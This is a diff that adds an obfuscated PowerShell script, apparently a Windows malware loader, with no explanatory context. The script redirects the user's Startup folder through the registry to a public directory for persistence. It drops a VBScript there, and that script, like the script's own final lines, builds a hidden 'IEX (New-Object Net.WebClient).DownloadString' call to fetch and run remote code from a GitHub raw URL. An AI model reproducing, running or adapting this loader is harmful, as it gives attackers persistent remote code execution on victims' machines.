@@ -1,0 +1,51 @@
+$H1="C:\Use++++++++++++++++++++un".Replace("++++++++++++++++++++","rs\Public\R")
+$H2 = "Crea--------------------ry".Replace("--------------------","teDirecto")
+[system.io.directory]::$H2($H1)
+start-sleep -s 5
+$H3 = "HKCU:\Softw-----------------lders".Replace("-----------------","are\Microsoft\Windows\CurrentVersion\Explorer\User Shell Fo")
+$H4= "HKCU:\Softwar+++++++++++++++++++++++++++ders".Replace("+++++++++++++++++++++++++++","e\Microsoft\Windows\CurrentVersion\Explorer\Shell Fol")
+$H5 = "C:\Us--------------c\Run".Replace("--------------","ers\Publi")
+$H6 ="C------------blic\Run".Replace("------------",":\Users\Pu")
+
+Set-ItemProperty -Path $H3 -Name "Startup" -Value $H5;
+Set-ItemProperty -Path $H4 -Name "Startup" -Value $H6;
+start-sleep -s 5
+$Content = @'
+Dim FBI
+AA = Chr(69)
+Set FBI= CreateObject("WScript.SH"+AA+"LL")
+Donal=chr(80) &"O" & Chr(87)
+Trump = Chr(69)
+mike = Chr(82) & "s"&"H" & Chr(69)
+pompeo = Chr(76)
+Elon =Chr(76)&" $TRUMP ='https://raw.githubusercontent.com/osamabinlad3n/txt/main/Server.txt';$"
+WHO = "B ='E"
+ERO = "TH COINt.W"&"TF COINlIOSNT'.Re"
+AA = "place('ET"&"H CO"&"IN','nE').Repl"
+BB = "ace('TF CO"&"IN','EbC').Rep"
+CC = "lace('O"&"S','e');"
+MUSK = "$CC = 'DOS CO"&"IN L"&"SOSCOINnG'.Rep"
+DD = "lace('S CO"&"IN ','Wn').Repl"
+FF = "ace('SO','o"&"aD').Rep"
+GG = "lace('CO"&"IN','TrI');"
+SHIB =""
+INU ="$A ='I`Eos CO"&"IN`W`BTC CO"&"INj`ETH COIN $B).$CC($TRUMP)'.Rep"
+KK = "lace('os CO"&"IN','X(n`e').Repl"
+TT = "ace('BTC CO"&"IN','-Ob').Rep"
+ENB = "lace('TH CO"&"IN','`c`T');"
+PUMP ="&('I'+'E"
+OS = "X')($A -J"
+SOS = "oin '')|&('I'+'E"
+EOS = "X');"
+COIN = Donal+Trump++mike+pompeo+Elon+WHO+ERO+AA+BB+CC+MUSK+DD+FF+GG+SHIB+INU+KK+TT+ENB+PUMP+OS+SOS+EOS+""
+FBI.Run COIN,0
+'@
+Set-Content -Path C:\Users\Public\Run\Run.vbs -Value $Content
+
+start-sleep -s 5
+
+$TRUMP = 'https://raw.githubusercontent.com/osamabinlad3n/txt/main/Server.txt';
+$B = 'ETH COINt.WTF COINlIOSNT'.Replace('ETH COIN','nE').Replace('TF COIN','EbC').Replace('OS','e');
+$CC = 'DOS COIN LSOSCOINnG'.Replace('S COIN ','Wn').Replace('SO','oaD').Replace('COIN','TrI');
+$A ='I`Eos COIN`W`BTC COINj`ETH COIN $B).$CC($TRUMP)'.Replace('os COIN','X(n`e').Replace('BTC COIN','-Ob').Replace('TH COIN','`c`T');
+&('I'+'EX')($A -Join '')|&('I'+'EX');
